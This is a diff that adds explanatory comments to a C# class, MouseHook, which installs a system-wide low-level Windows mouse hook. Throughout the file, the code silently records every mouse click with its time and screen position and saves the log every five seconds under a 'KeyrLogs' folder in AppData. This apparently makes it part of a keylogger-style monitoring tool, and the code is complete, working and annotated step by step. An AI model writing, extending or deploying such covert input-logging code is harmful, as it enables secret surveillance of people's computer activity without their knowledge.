@@ -9,18 +9,23 @@ namespace ServiceApp
 {
     public static class MouseHook
     {
+        // Windows Hook ID for Low-Level Mouse events
         private const int WH_MOUSE_LL = 14;
+
+        // Windows Message constants for mouse button clicks
         private const int WM_LBUTTONDOWN = 0x0201;
         private const int WM_RBUTTONDOWN = 0x0204;
         private const int WM_MBUTTONDOWN = 0x0207;
 
         private static StringBuilder buffer = new StringBuilder();
         private static IntPtr _hookId = IntPtr.Zero;
-        private static LowLevelMouseProc _proc = HookCallback;
+        private static LowLevelMouseProc _proc = HookCallback; // Kept in a variable to prevent Garbage Collection
         private static System.Timers.Timer timer;
 
+        // Delegate defining the signature for the hook callback function
         private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        // Native struct to hold screen coordinates
         [StructLayout(LayoutKind.Sequential)]
         public struct POINT
         {
@@ -28,6 +33,7 @@ namespace ServiceApp
             public int y;
         }
 
+        // Native struct that Windows sends containing mouse event details
         [StructLayout(LayoutKind.Sequential)]
         public struct MSLLHOOKSTRUCT
         {
@@ -37,11 +43,13 @@ namespace ServiceApp
             public uint time;
             public IntPtr dwExtraInfo;
         }
+
         public static void StartHook()
         {
             _hookId = SetHook(_proc);
 
-            timer = new System.Timers.Timer(5000); 
+            // Setup timer to save logs to disk every 5 seconds
+            timer = new System.Timers.Timer(5000);
             timer.Elapsed += Timer_Elapsed;
             timer.AutoReset = true;
             timer.Start();
@@ -49,21 +57,25 @@ namespace ServiceApp
 
         public static void StopHook()
         {
-            UnhookWindowsHookEx(_hookId);
+            // Release the Windows hook
+            UnhookWindowsHookEx(_hookId); 
             timer?.Stop();
             timer?.Dispose();
         }
 
         private static IntPtr SetHook(LowLevelMouseProc proc)
         {
+            // Link the hook to the current process module
             using var curProcess = Process.GetCurrentProcess();
             using var curModule = curProcess.MainModule;
+            // Registers the hook with the OS
             return SetWindowsHookEx(WH_MOUSE_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
         }
 
+        // This method is called by Windows every time the mouse moves or clicks
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0)
+            if (nCode >= 0) 
             {
                 string buttonClicked = "";
                 if (wParam == (IntPtr)WM_LBUTTONDOWN) buttonClicked = "L-CLICK";
@@ -72,12 +84,14 @@ namespace ServiceApp
 
                 if (!string.IsNullOrEmpty(buttonClicked))
                 {
+                    // Map the raw memory pointer (lParam) to our MSLLHOOKSTRUCT
                     MSLLHOOKSTRUCT hookStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
 
                     int x = hookStruct.pt.x;
                     int y = hookStruct.pt.y;
                     string timestamp = DateTime.Now.ToString("HH:mm:ss");
 
+                    // Thread-safe buffering of the click data
                     lock (buffer)
                     {
                         buffer.AppendLine($"{buttonClicked}:{timestamp}:{x}:{y}");
@@ -85,6 +99,7 @@ namespace ServiceApp
                     Debug.WriteLine($"Mouse: {buttonClicked} at {x},{y}");
                 }
             }
+            // Pass the event to the next application in the hook chain
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
 
@@ -95,15 +110,19 @@ namespace ServiceApp
             {
                 if (buffer.Length == 0) return;
                 data = buffer.ToString();
-                buffer.Clear();
+                buffer.Clear(); // Empty buffer after copying data
             }
 
+            // Define file path: AppData/Roaming/KeyrLogs/Mouse
             string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "KeyrLogs", "Mouse");
             if (!Directory.Exists(folder)) Directory.CreateDirectory(folder);
 
+            // Create filename based on current date
             string file = Path.Combine(folder, DateTime.Now.ToString("yyyy-MM-dd") + "_mouse.txt");
-            File.AppendAllText(file, data);
+            File.AppendAllText(file, data); 
         }
+
+        // --- Native Windows API Imports ---
 
         [DllImport("user32.dll")]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);
